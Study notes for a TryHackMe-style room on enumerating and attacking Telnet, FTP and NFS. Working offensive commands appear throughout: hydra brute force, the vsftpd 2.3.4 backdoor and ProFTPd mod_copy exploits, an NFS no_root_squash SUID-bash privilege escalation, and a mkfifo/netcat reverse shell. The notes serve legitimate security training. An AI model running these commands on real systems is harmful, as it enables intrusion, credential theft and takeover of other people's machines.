# 🌐 Akshat's Notes — File 3
## Network Services Enumeration — Telnet, FTP, NFS

> TryHackMe "Network Services" room — complete notes.
> Simple language. Real examples. Day 5 of 60-Day Roadmap 🔥

---

# 🎯 What Is Enumeration?

## The Simple Explanation

Enumeration means **gathering as much information as possible** about a target system before attacking it. Think of it as doing your homework before an exam.

**Real Life Example 🌍**
> Before robbing a bank (in movies!), criminals don't just walk in. They:
> - Watch the building for days (what time do guards change?)
> - Count the cameras (where are the blind spots?)
> - Find out what security system is used (can it be bypassed?)
> - Learn the layout (where's the vault?)
>
> **That's enumeration.** Attackers (and ethical hackers) do the same thing with computer systems — gather information before making a move.

## Why Enumeration Matters

```
Without enumeration:          With enumeration:
Blind attack → usually fails  Informed attack → much higher success

"I'll try everything"         "Port 21 is open, running vsftpd 2.3.4,
                               which has a known backdoor vulnerability
                               in Metasploit. I know exactly what to do."
```

## The Enumeration Process

```
Step 1: Port Scan
        "Which ports are open? Which services are running?"
        Tool: nmap

Step 2: Service Identification  
        "What version of the software? What OS?"
        Tool: nmap -sV, banner grabbing

Step 3: Vulnerability Research
        "Does this version have known vulnerabilities?"
        Tool: searchsploit, CVE databases

Step 4: Exploitation
        "Use the vulnerability to get access"
        Tool: Metasploit, manual exploits

Step 5: Post-Exploitation
        "What can I do now that I'm in?"
```

---

# 📡 PART 1 — TELNET

## What Is Telnet?

Telnet is a protocol that lets you connect to a remote computer and control it via command line — like SSH but with **zero security**. Everything is sent in plain text.

**Port:** 23 (TCP)

**Real Life Example 🌍**
> Telnet is like having a conversation through a megaphone in a public market. Everyone around you can hear:
> - Your username
> - Your password  
> - Every command you type
> - Every response you get
>
> Anyone with a packet sniffer on the same network sees everything.

```
Normal user:
telnet 192.168.1.1
Login: admin
Password: admin123
$ ls /etc
[lists files]

Attacker on same network running Wireshark:
Captures literally: "admin\nadmin123\nls /etc\n..."
Sees everything in plain text!
```

---

## Why Telnet Still Matters in Security

Even though Telnet is ancient and insecure, you'll encounter it because:

1. **Old network equipment** (routers, switches, printers) still use it
2. **IoT devices** often have Telnet enabled by default
3. **Legacy systems** that haven't been updated
4. **Misconfigured servers** where admin forgot to disable it
5. **CTF challenges** use it regularly (including TryHackMe!)

> 🔴 **SOC rule:** If you see port 23 open in your SIEM alert — that's an immediate investigation. Either it's a misconfigured device or an attacker opened a backdoor.

---

## Enumerating Telnet — Step by Step

### Step 1: Discover Telnet with Nmap

```bash
# Basic scan — check if port 23 is open
nmap -p 23 192.168.1.1

# Service version detection
nmap -p 23 -sV 192.168.1.1

# Full scan with scripts
nmap -p 23 -sV -sC 192.168.1.1

# Scan entire network for Telnet
nmap -p 23 192.168.1.0/24

# Example output:
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
| telnet-ntlm-info:
|   Target_Name: WORKGROUP
|   Product_Version: 10.0.17763
```

### Step 2: Banner Grabbing

The first thing Telnet sends when you connect is a **banner** — a greeting that often reveals the system type and version.

```bash
# Connect and see the banner
telnet 192.168.1.1

# Using netcat (better — doesn't interact, just shows banner)
nc -nv 192.168.1.1 23

# Using curl
curl telnet://192.168.1.1:23

# Example banners you might see:
"Ubuntu 20.04.1 LTS"                    ← OS revealed!
"Cisco IOS Software Version 15.1"       ← Router model revealed!
"Welcome to MikroTik RouterOS"          ← Device type revealed!
"\xFF\xFD\x18\xFF\xFD ..."             ← Telnet negotiation bytes (normal)
```

### Step 3: Try Default Credentials

Most devices with Telnet enabled have default credentials:

```bash
# Common default credentials to try:
admin:admin
admin:password
admin:(blank)
root:root
root:password
root:(blank)
user:user
guest:guest
admin:1234
admin:12345

# For specific devices:
# Cisco routers:     cisco:cisco  OR  admin:cisco
# MikroTik:          admin:(blank)
# D-Link routers:    admin:admin
# Linksys:           admin:admin
# Many IoT devices:  admin:admin  OR  root:root
```

```bash
# Manual attempt
telnet 192.168.1.1
# Wait for login prompt
# Type credentials

# Automated with hydra (brute force)
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://192.168.1.1
hydra -L users.txt -P passwords.txt telnet://192.168.1.1 -V
```

### Step 4: What to Do Once Connected

```bash
# Once you get in via Telnet:

# Who am I?
whoami
id

# What system is this?
uname -a
cat /etc/os-release
hostname

# What users exist?
cat /etc/passwd

# What's running?
ps aux

# Network info
ifconfig
ip addr
netstat -an

# Sensitive files
cat /etc/shadow    (needs root)
ls -la /root/
ls -la /home/

# Look for flags (CTF)
find / -name "*.txt" 2>/dev/null
find / -name "flag*" 2>/dev/null
```

---

## TryHackMe Telnet Room — Walkthrough Approach

```bash
# Step 1: Scan the target
nmap -A -p- [target_ip]
# -A = aggressive (OS detection, version, scripts)
# -p- = all 65535 ports (Telnet might not be on port 23!)

# If Telnet is on a non-standard port (e.g., 8012):
telnet [target_ip] 8012

# Step 2: Read the banner carefully
# It might say: "SKIDY'S BACKDOOR. Type .RUN <command> to run a command"
# or some hint about how to interact

# Step 3: Try to run commands
.RUN whoami
.RUN ls -la
.RUN cat /home/user/flag.txt

# Step 4: Get a proper shell (reverse shell via Telnet)
# On your machine, start a listener:
nc -lvnp 4444

# Through Telnet, run:
.RUN mkfifo /tmp/pipe; /bin/sh -i < /tmp/pipe 2>&1 | nc [your_ip] 4444 > /tmp/pipe
```

---

## Telnet Security Summary

| Risk | Detail |
|------|--------|
| **Credential theft** | Username + password visible in plain text on network |
| **Session hijacking** | Attacker can inject commands into active session |
| **No integrity** | Data can be modified in transit |
| **No authentication of server** | Can't verify you're talking to the real server |

**Fix:** Replace Telnet with **SSH** everywhere. `sudo apt install openssh-server`

---

# 📁 PART 2 — FTP (File Transfer Protocol)

## What Is FTP?

FTP transfers files between computers over a network. Like Telnet — it sends everything in **plain text** including credentials.

**Ports:**
- **Port 21** = Control channel (commands)
- **Port 20** = Data channel (actual file transfer, active mode)

**Real Life Example 🌍**
> FTP is like a filing cabinet with a transparent glass door. You put files in, take files out. But everyone walking past can see:
> - What key you used to open it (your password)
> - What files you're putting in or taking out
> - What the files contain
>
> Anyone on the same network sees ALL of this.

---

## FTP Modes — Active vs Passive

This confuses people. Let's make it clear:

### Active Mode
```
Client → Server: "I'm ready! Connect to MY port 5000 for data"
Server → Client: Connects BACK to client port 5000

Problem: Client's firewall often BLOCKS incoming connections from server!
Result: Connection fails through firewalls
```

### Passive Mode
```
Client → Server: "I'm ready! What port should I connect to for data?"
Server → Client: "Connect to MY port 50234"
Client → Server: Connects to server port 50234

Result: Client always initiates both connections → Firewalls happy!
This is why almost all FTP today uses PASSIVE mode.
```

```bash
# Force passive mode in command-line FTP
ftp> passive    # Toggle passive mode
```

---

## Enumerating FTP — Step by Step

### Step 1: Discover FTP with Nmap

```bash
# Basic check
nmap -p 21 192.168.1.1

# Version detection (CRITICAL — version determines exploits!)
nmap -p 21 -sV 192.168.1.1

# Run FTP-specific scripts
nmap -p 21 --script ftp-* 192.168.1.1

# Check for anonymous login specifically
nmap -p 21 --script ftp-anon 192.168.1.1

# Example output:
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.1.50
|      Logged in as ftp
```

**vsftpd 2.3.4** — this is VERY important! This specific version has a famous backdoor. Always check the version!

### Step 2: Anonymous FTP Login

Many FTP servers allow **anonymous login** — anyone can connect without credentials!

```bash
# Connect to FTP server
ftp 192.168.1.1

# When prompted for username:
Name: anonymous    # or: ftp

# When prompted for password:
Password: (press Enter or type any email like guest@guest.com)

# If it works, you're in!
ftp> ls            # List files
ftp> dir           # Same as ls
ftp> pwd           # Where am I?
ftp> cd folder     # Change directory
ftp> get file.txt  # Download a file
ftp> put file.txt  # Upload a file
ftp> mget *.txt    # Download multiple files
ftp> bye           # Disconnect
```

**Real example of what you might find:**
```
ftp> ls -la
drwxr-xr-x    2 ftp      ftp          4096 Jan 15 2024 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 15 2024 ..
-rw-r--r--    1 ftp      ftp           220 Jan 15 2024 .bash_logout
-rw-r--r--    1 ftp      ftp            35 Jan 15 2024 .profile
-rw-r--r--    1 ftp      ftp            17 Jan 15 2024 backup_creds.txt
-rw-r--r--    1 ftp      ftp          1024 Jan 15 2024 id_rsa         ← SSH private key!
```

### Step 3: Download Everything Interesting

```bash
# Download a single file
ftp> get backup_creds.txt

# Download entire FTP directory recursively
wget -r ftp://anonymous:anonymous@192.168.1.1/

# Using curl
curl -u anonymous:anonymous ftp://192.168.1.1/ --list-only
curl -u anonymous:anonymous ftp://192.168.1.1/file.txt -o file.txt

# Using lftp (best for recursive download)
lftp -u anonymous,anonymous 192.168.1.1
lftp> mirror /     # Download everything recursively
```

### Step 4: Brute Force FTP Credentials

```bash
# Hydra — FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1 -V -t 4

# Medusa
medusa -h 192.168.1.1 -u admin -P /usr/share/wordlists/rockyou.txt -M ftp

# Common FTP default credentials:
# admin:admin
# ftp:ftp
# anonymous:(blank)
# root:root
# user:password
```

---

## FTP Vulnerabilities — The Famous Ones

### vsftpd 2.3.4 Backdoor (CVE-2011-2523)

**The Story:** In 2011, someone uploaded a backdoored version of vsftpd (Very Secure FTP Daemon) to the official server. It contained a hidden backdoor — if you typed a username ending with `:)` (smiley face), the server opened a root shell on port 6200!

```bash
# Check if target is vulnerable
nmap -p 21 -sV 192.168.1.1
# If it shows: vsftpd 2.3.4 → VULNERABLE!

# Exploit with Metasploit
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.1
run
# If vulnerable: you get a root shell!

# Manual exploit:
# Connect via Telnet and type username with :)
telnet 192.168.1.1 21
USER backdoor:)
PASS anything
# Then connect to port 6200:
nc 192.168.1.1 6200
whoami    # → root !
```

**Real Life Example 🌍**
> Imagine someone sneaked a copy key into the locksmith's master key cabinet. The locksmith distributed this key to customers thinking it was legitimate. But the evil copy also opens a secret door in every building that used it. That's exactly what happened with vsftpd 2.3.4.

### ProFTPd 1.3.5 Mod_Copy (CVE-2015-3306)

```bash
# ProFTPd 1.3.5 allows unauthenticated file copy via SITE CPFR/CPTO commands
nc 192.168.1.1 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
# Now access: http://192.168.1.1/passwd.txt → Got /etc/passwd!

# Copy SSH private key
SITE CPFR /home/user/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa
# Download it: curl http://192.168.1.1/id_rsa
```

### FTP Bounce Attack

```bash
# Old FTP servers allowed the PORT command to specify ANY IP
# Attacker could make the FTP server scan OTHER machines on internal network!
# Modern servers block this, but worth knowing
nmap -b anonymous:@192.168.1.1 192.168.1.0/24    # FTP bounce scan
```

---

## Connecting to FTP — All Methods

```bash
# Standard FTP client
ftp 192.168.1.1
ftp -p 192.168.1.1    # Force passive mode

# Netcat (raw connection — see exactly what's happening)
nc -nv 192.168.1.1 21

# Windows (command prompt)
ftp 192.168.1.1

# FileZilla (GUI — great for seeing files visually)
# Host: 192.168.1.1, Username: anonymous, Password: (blank), Port: 21

# lftp (best command-line client)
lftp -u username,password 192.168.1.1

# curl
curl ftp://192.168.1.1/ -u anonymous:
curl ftp://192.168.1.1/file.txt -u username:password -o localfile.txt
```

---

## FTP Commands Reference

```bash
# Navigation
ls          # List files
dir         # Same as ls
pwd         # Current directory
cd folder   # Change directory
cdup        # Go up one level

# File transfer
get file.txt        # Download file
mget *.txt          # Download multiple files (wildcard)
put file.txt        # Upload file
mput *.txt          # Upload multiple files
recv file.txt       # Same as get
send file.txt       # Same as put

# Transfer mode
binary      # Binary mode (use for images, executables — IMPORTANT!)
ascii       # ASCII mode (for text files only)
             # Wrong mode = corrupted files!

# Other
hash        # Show # for each block downloaded (progress)
passive     # Toggle passive mode
status      # Show current settings
help        # Show all commands
bye / quit  # Disconnect
```

---

## What to Look For in FTP

During a pentest or CTF, check these:

```bash
# Interesting file names to look for
ls -la | grep -i "pass\|cred\|key\|secret\|backup\|config\|admin\|root"

# Get all files and search locally
wget -r ftp://anonymous@192.168.1.1/
grep -ri "password" ./
grep -ri "username" ./
grep -ri "secret" ./
find . -name "*.conf" -o -name "*.bak" -o -name "*.sql"

# Check for SSH keys
find . -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*.key"
```

---

# 📂 PART 3 — NFS (Network File System)

## What Is NFS?

NFS lets you **mount a remote directory** as if it were a local folder. A Linux server can share a directory over the network, and other machines can access it just like a local disk.

**Port:** 2049 (TCP/UDP)
**Related ports:** 111 (rpcbind/portmapper — needed to find NFS)

**Real Life Example 🌍**
> NFS is like a shared Google Drive folder — but at the operating system level. The server puts a folder on the network. Any authorised client can mount it and see the files as if they're on their own computer. Even create, edit, and delete files.
>
> The security problem: old NFS configurations allow ANYONE on the network to mount the share!

---

## How NFS Works

```
NFS Server (192.168.1.100):
  Has directory: /home/shared/
  Exports it to the network via /etc/exports

NFS Client (192.168.1.50):
  Mounts it: mount 192.168.1.100:/home/shared /mnt/remote
  Now /mnt/remote on the client shows files from the server!

Files created on client in /mnt/remote/ appear on server in /home/shared/
Files created on server in /home/shared/ appear on client in /mnt/remote/
```

---

## The `/etc/exports` File — Where Shares Are Configured

On the NFS server, this file controls who can access what:

```bash
# /etc/exports — NFS share configuration
/home/shared    *(rw,sync,no_subtree_check)
#               ↑ Options explained:
#               * = ANY IP can connect (dangerous!)
#               rw = read and write
#               sync = write to disk immediately
#               no_subtree_check = don't verify file is in exported tree

# Safer configuration:
/home/shared    192.168.1.0/24(rw,sync,root_squash)
#               Only allow the 192.168.1.0/24 subnet
#               root_squash = if client connects as root, map to nobody user

# Dangerous option:
/home/shared    *(rw,sync,no_root_squash)
#               no_root_squash = if client is root, they have ROOT on server share!
#               This is a massive vulnerability!
```

---

## Enumerating NFS — Step by Step

### Step 1: Discover NFS with Nmap

```bash
# Scan for NFS-related ports
nmap -p 111,2049 192.168.1.100

# Use NFS-specific scripts
nmap -p 111,2049 --script nfs-* 192.168.1.100

# Example output:
PORT     STATE SERVICE
111/tcp  open  rpcbind
2049/tcp open  nfs

Host script results:
| nfs-showmount:
|   /home/shared *               ← Shared with ANYONE (*)!
|   /var/nfs/home 192.168.1.0/24
| nfs-ls: Volume /home/shared
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
|   drwxrwxrwx  2 1001 1001  4096 Jan 15 2024  .
|   drwxr-xr-x 21 0    0     4096 Jan 15 2024  ..
|   -rw-rw-rw-  1 1001 1001  7 Jan 15 2024   backup_creds.txt
```

### Step 2: List Available Shares

```bash
# showmount — show what NFS shares are available
showmount -e 192.168.1.100

# Example output:
Export list for 192.168.1.100:
/home/ubuntu   *              ← Accessible by anyone!
/var/nfs/home  192.168.1.0/24

# rpcinfo — more detailed RPC service info
rpcinfo -p 192.168.1.100
```

### Step 3: Mount the NFS Share

```bash
# Create a local directory to mount to
mkdir /tmp/nfs_mount

# Mount the remote share
sudo mount -t nfs 192.168.1.100:/home/ubuntu /tmp/nfs_mount

# Now browse it like a local folder!
ls -la /tmp/nfs_mount/
cat /tmp/nfs_mount/interesting_file.txt

# When done, unmount
sudo umount /tmp/nfs_mount

# Mount with options (useful if connection issues)
sudo mount -t nfs -o nfsvers=3 192.168.1.100:/home/ubuntu /tmp/nfs_mount
```

### Step 4: Enumerate Mounted Files

```bash
# Once mounted, look for sensitive data
ls -laR /tmp/nfs_mount/

# Look for SSH keys
find /tmp/nfs_mount/ -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null

# Look for passwords in files
grep -ri "password" /tmp/nfs_mount/ 2>/dev/null
grep -ri "secret" /tmp/nfs_mount/ 2>/dev/null

# Check bash history
cat /tmp/nfs_mount/.bash_history

# Check SSH config
cat /tmp/nfs_mount/.ssh/authorized_keys
cat /tmp/nfs_mount/.ssh/id_rsa      ← Private key = SSH access!
cat /tmp/nfs_mount/.ssh/config
```

---

## NFS Privilege Escalation — The Big Attack

### The `no_root_squash` Vulnerability

This is one of the most powerful NFS misconfigurations. When `no_root_squash` is set:

**Root on the client machine = Root on the NFS share**

You can exploit this to get root on the SERVER:

```bash
# Scenario:
# - You're a regular user on client machine (192.168.1.50)
# - NFS share is mounted: /home/ubuntu (with no_root_squash)
# - You CAN become root on the client (but not on server)

# Step 1: Become root on YOUR machine (client)
sudo su -

# Step 2: Copy /bin/bash to the NFS share
cp /bin/bash /tmp/nfs_mount/bash

# Step 3: Set the SUID bit on it (as root, this works!)
chmod +s /tmp/nfs_mount/bash
# Now bash on the share has SUID root ownership

# Step 4: Go back to the TARGET SERVER (via whatever access you have)
# On the server, the file appears as:
ls -la /home/ubuntu/bash
# -rwsr-sr-x 1 root root 1183448 Jan 15 bash
#    ↑ SUID bit! This file runs as root!

# Step 5: Execute bash with SUID preserved
/home/ubuntu/bash -p
# -p flag = preserve effective UID (run as root!)

whoami
# root ← You're root on the server!
```

**Real Life Example 🌍**
> Imagine the server owner has a cabinet (NFS share) with a sign: "Root in my house = root in this cabinet too" (`no_root_squash`).
>
> You become the manager of your own building (root on client), walk into their cabinet, place a master key inside (`bash -p` with SUID), then when you use that key at their building entrance — it opens as the building owner!

---

## NFS — Full Attack Flow (TryHackMe Style)

```bash
# ── PHASE 1: RECONNAISSANCE ──────────────────────────────────
# Scan target
nmap -A -p- 192.168.1.100 -oN scan.txt

# Note: port 2049 open → NFS!
# Check what's shared
showmount -e 192.168.1.100

# Output: /home/ubuntu *   ← Available to everyone!

# ── PHASE 2: MOUNT THE SHARE ─────────────────────────────────
mkdir /tmp/mount
sudo mount -t nfs 192.168.1.100:/home/ubuntu /tmp/mount -nolock

# ── PHASE 3: ENUMERATE FILES ─────────────────────────────────
ls -laR /tmp/mount/

# Found: .ssh directory!
ls -la /tmp/mount/.ssh/
# id_rsa exists → SSH private key!

# Copy it
cp /tmp/mount/.ssh/id_rsa /tmp/id_rsa
chmod 600 /tmp/id_rsa

# Find username from passwd or authorized_keys
cat /tmp/mount/.ssh/authorized_keys
# ssh-rsa AAAA... ubuntu@target

# ── PHASE 4: LOGIN WITH STOLEN KEY ──────────────────────────
ssh -i /tmp/id_rsa ubuntu@192.168.1.100
# You're in as ubuntu!

# ── PHASE 5: PRIVILEGE ESCALATION VIA NFS ───────────────────
# Check if no_root_squash is configured
cat /etc/exports
# /home/ubuntu *(rw,sync,no_root_squash,no_subtree_check)
# no_root_squash! → Privilege escalation possible!

# On your attack machine (as root):
sudo su -
cp /bin/bash /tmp/mount/bash
chmod +s /tmp/mount/bash
ls -la /tmp/mount/bash
# -rwsr-sr-x root root ... bash ← SUID set!

# On target machine (as ubuntu):
/home/ubuntu/bash -p
whoami
# root! ← Full server takeover!

# Find the flag
find / -name "root.txt" 2>/dev/null
cat /root/root.txt
```

---

## NFS Security Summary

| Misconfiguration | Risk | Fix |
|-----------------|------|-----|
| `*` (any host) in exports | Anyone can mount | Specify exact IPs/subnets |
| `no_root_squash` | Client root = server root = privilege escalation | Use `root_squash` (default) |
| `rw` on sensitive dirs | Attacker can write files | Use `ro` (read-only) unless needed |
| No firewall on port 2049 | Anyone on internet can access | Firewall — only allow trusted IPs |
| Sensitive data in shares | Data exposure | Don't share `/home` or sensitive dirs |

---

# 🛠️ PART 4 — TOOLS QUICK REFERENCE

## Nmap — Your First Tool Always

```bash
# Quick scan (top 1000 ports)
nmap 192.168.1.1

# Full port scan
nmap -p- 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 192.168.1.1

# Specific ports
nmap -p 21,23,2049 192.168.1.1

# Scan with specific scripts
nmap --script ftp-anon 192.168.1.1
nmap --script ftp-* 192.168.1.1
nmap --script nfs-* 192.168.1.1
nmap --script telnet-* 192.168.1.1

# Save output
nmap -A 192.168.1.1 -oN output.txt    # Normal text
nmap -A 192.168.1.1 -oX output.xml    # XML
nmap -A 192.168.1.1 -oG output.grep   # Grepable
nmap -A 192.168.1.1 -oA output        # All formats

# Stealth scan (slower but less detectable)
nmap -sS 192.168.1.1    # SYN scan (half-open)
nmap -sN 192.168.1.1    # NULL scan
nmap -sF 192.168.1.1    # FIN scan

# Speed settings
nmap -T1 192.168.1.1    # Very slow (stealthy)
nmap -T3 192.168.1.1    # Default
nmap -T5 192.168.1.1    # Very fast (noisy)
```

## Hydra — Brute Force Tool

```bash
# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1

# Telnet brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://192.168.1.1

# SSH brute force
hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Multiple usernames
hydra -L users.txt -P passwords.txt ftp://192.168.1.1

# Common flags
-l   = single username
-L   = file of usernames
-p   = single password
-P   = file of passwords
-V   = verbose (show each attempt)
-t 4 = 4 threads (parallel attempts)
-f   = stop after first success
-s   = specify port
```

## Metasploit — Exploitation Framework

```bash
# Start Metasploit
msfconsole

# Search for exploits
search vsftpd
search type:exploit name:ftp
search telnet

# Use an exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# See options
show options

# Set target
set RHOSTS 192.168.1.1

# Set your IP (for reverse shells)
set LHOST 192.168.1.50

# Run it
run
exploit    # Same as run

# After successful exploit:
whoami
id
cat /root/root.txt
```

## Netcat — The Swiss Army Knife

```bash
# Connect to any service (banner grabbing)
nc -nv 192.168.1.1 21     # FTP
nc -nv 192.168.1.1 23     # Telnet
nc -nv 192.168.1.1 2049   # NFS

# Listen for incoming connections (reverse shell listener)
nc -lvnp 4444

# Send a file
nc -lvnp 1234 > received_file.txt   # Receiver
nc 192.168.1.1 1234 < file_to_send.txt  # Sender

# Port scan (basic)
nc -zv 192.168.1.1 20-25
```

---

# 🔄 PART 5 — PUTTING IT ALL TOGETHER

## Typical CTF/Pentest Workflow

```bash
# ─── STEP 1: INITIAL RECON ──────────────────────────────────
# Broad scan to find open ports
nmap -sV -sC -p- [TARGET_IP] -oN initial_scan.txt

# Review results:
# - Port 21 → FTP (check version!)
# - Port 23 → Telnet (old/vulnerable device?)
# - Port 111/2049 → NFS (check for shares!)

# ─── STEP 2: SERVICE-SPECIFIC ENUM ─────────────────────────
# FTP:
nmap --script ftp-anon -p 21 [TARGET_IP]
ftp [TARGET_IP]     # try anonymous login

# Telnet:
nc -nv [TARGET_IP] 23    # grab banner
telnet [TARGET_IP]       # try default creds

# NFS:
showmount -e [TARGET_IP]
nmap --script nfs-ls -p 2049 [TARGET_IP]

# ─── STEP 3: EXPLOITATION ──────────────────────────────────
# FTP anonymous = download everything and look for creds/keys
wget -r ftp://anonymous@[TARGET_IP]/

# Telnet default creds found = log in and explore
telnet [TARGET_IP]
admin:admin

# NFS share accessible = mount and enumerate
sudo mount -t nfs [TARGET_IP]:/share /tmp/mount

# ─── STEP 4: POST-EXPLOITATION ─────────────────────────────
# Find flags
find / -name "*.txt" 2>/dev/null | xargs grep -l "flag\|THM\|HTB" 2>/dev/null

# Privilege escalation
sudo -l                               # What can I run as root?
find / -perm -u=s 2>/dev/null        # SUID files
cat /etc/exports                      # NFS no_root_squash?
```

---

# ❓ INTERVIEW QUESTIONS

**Q1: What is the difference between FTP active and passive mode?**

> "In active mode, the client opens a random port and tells the server to connect back to it for data transfer — the server initiates the data connection. This causes problems with firewalls because they block unexpected incoming connections from the server. In passive mode, the client asks the server to open a random port and the client connects to it — the client initiates both connections. Passive mode is now the default because it works through NAT and firewalls. From a security standpoint, passive mode is preferable because it reduces the attack surface on the client."

---

**Q2: Why is Telnet considered insecure and what replaced it?**

> "Telnet transmits everything in plain text — usernames, passwords, and all data. Anyone on the same network running a packet sniffer like Wireshark can read every character. There's also no server authentication — you can't verify you're talking to the real server. SSH (Secure Shell on port 22) replaced Telnet entirely. SSH uses public key cryptography to authenticate the server and encrypts all traffic. If I see port 23 open during a security audit, it's an immediate high-severity finding."

---

**Q3: What is no_root_squash in NFS and why is it dangerous?**

> "By default, NFS uses root_squash — if a client connects as root, their requests are mapped to a less-privileged user (nobody) on the server. This prevents a client's root user from having root privileges on the server's shared files. no_root_squash disables this protection, meaning if you're root on the client, you have root-level access on the NFS share. This is exploitable for privilege escalation: you copy /bin/bash to the NFS mount, set the SUID bit as root (which works because of no_root_squash), then execute it on the server with the -p flag to get a root shell."

---

**Q4: How would you enumerate an FTP server during a penetration test?**

> "First I'd run nmap with version detection: `nmap -p 21 -sV --script ftp-anon,ftp-syst target`. This tells me the FTP software and version (critical for finding known exploits), and whether anonymous login is allowed. I'd then try anonymous login manually. If the version is something like vsftpd 2.3.4 I'd check Metasploit for the backdoor exploit. I'd download everything accessible and search for credentials, SSH keys, config files, and backup files. For authenticated access, I'd attempt brute force with Hydra using common credentials and rockyou.txt."

---

**Q5: You find NFS port 2049 open. What's your methodology?**

> "I'd first run `showmount -e [target]` to list exported shares and their permissions. If I see `*` as the allowed host, it means anyone can mount it. I'd create a local directory, mount the share with `sudo mount -t nfs [target]:/sharepath /tmp/mount`, then enumerate thoroughly — looking for SSH keys, bash history, config files, and credential files. I'd also check `/etc/exports` if I get shell access — specifically for `no_root_squash` which enables privilege escalation by placing a SUID bash binary on the share from my attack machine as root."

---

# 📌 CHEAT SHEET — Stick This on Your Wall

```
╔══════════════════════════════════════════════════════════╗
║       NETWORK SERVICES ENUMERATION QUICK REF            ║
╠══════════════════════════════════════════════════════════╣
║  TELNET (Port 23)                                        ║
║  telnet [ip]           → Connect                        ║
║  nc -nv [ip] 23        → Banner grab                   ║
║  Default creds: admin:admin, root:root, admin:(blank)   ║
║  Always replace with SSH! Port 22.                      ║
╠══════════════════════════════════════════════════════════╣
║  FTP (Ports 20/21)                                      ║
║  nmap --script ftp-anon -p 21 [ip]  → Anon check       ║
║  ftp [ip]              → Connect (try anonymous)        ║
║  wget -r ftp://anon@[ip]/  → Download everything        ║
║  vsftpd 2.3.4 → BACKDOOR → use Metasploit!             ║
║  Active=server connects back / Passive=client initiates ║
╠══════════════════════════════════════════════════════════╣
║  NFS (Port 2049 + 111)                                  ║
║  showmount -e [ip]     → List shares                   ║
║  mount -t nfs [ip]:/share /mnt  → Mount share          ║
║  Check /etc/exports for no_root_squash!                 ║
║  no_root_squash = copy SUID bash → root shell           ║
╠══════════════════════════════════════════════════════════╣
║  NMAP ONE-LINERS                                        ║
║  nmap -sV -sC -p- [ip]     → Full enumeration         ║
║  nmap --script ftp-* [ip]  → All FTP scripts           ║
║  nmap --script nfs-* [ip]  → All NFS scripts           ║
╠══════════════════════════════════════════════════════════╣
║  HYDRA BRUTE FORCE                                      ║
║  hydra -l admin -P rockyou.txt ftp://[ip]              ║
║  hydra -l admin -P rockyou.txt telnet://[ip]           ║
╠══════════════════════════════════════════════════════════╣
║  WORKFLOW: Scan → Banner grab → Anon/default creds     ║
║           → Version research → Exploit → Escalate      ║
╚══════════════════════════════════════════════════════════╝
```

---

> **Day 5 File 3 ✅** — Now combine all 3 notes and do the TryHackMe "Network Services" room.
> Everything in that room is covered in this file. You'll fly through it. 💪
